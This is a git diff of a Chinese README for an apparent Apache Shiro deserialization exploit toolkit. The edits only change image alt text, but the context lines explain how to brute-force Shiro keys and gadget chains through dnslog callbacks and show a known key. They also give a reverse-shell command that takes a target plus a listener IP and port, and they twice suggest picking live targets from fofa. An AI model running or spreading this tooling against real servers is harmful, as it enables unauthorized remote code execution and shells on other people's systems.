@@ -32,8 +32,8 @@ U3ByaW5nQmxhZGUAAAAAAA.CommonsBeanutils1.x9zm4v.dnslog.cn
 可知成功的key为`U3ByaW5nQmxhZGUAAAAAAA==`,模块为`CommonsBeanutils1`
 因为key中包含==/+等符号，本项目会转义一丢丢。需自行对比附录1的key
 fofa上找一个玩玩
-![](./img/1.png)
-![](./img/2.png)
+![1.png](./img/1.png)
+![2.png](./img/2.png)
 ##### shiro_crack.py 原理
 其实网上有很多爆破模块和key的工具，但是爆破成功后一般只是打通，并不知道模块和key是什么，因为对于无回显的rce，无论通没通，响应码均为200。
 本项目通过爆破模块和key结合dnslog间接获取成功的key和模块，原理即为DNSlog的内涵，Dns在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息。
@@ -57,8 +57,8 @@ key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
 
 改成爆破成功的key
 fofa上找一个玩
-![](./img/3.png)
-![](./img/4.png)
+![3.png](./img/3.png)
+![4.png](./img/4.png)
 
 ### 3、shiro_getshell 反弹shell
 ```
@@ -68,10 +68,9 @@ python3 shiro_exp.py -u {{攻击的靶机}} -lh {{反弹shell的ip}} -lp {{反�
 为了安全，还是打本地
 原理即是把JRMPListener和payload打包丢一起了，其实讲道理可以不用jrmplistener
 
-
 #### shiro_getshell测试：
-
-![](./img/5.png)
+![6.png](./img/6.png)
+![5.png](./img/5.png)
 
 ---
 一点小想法
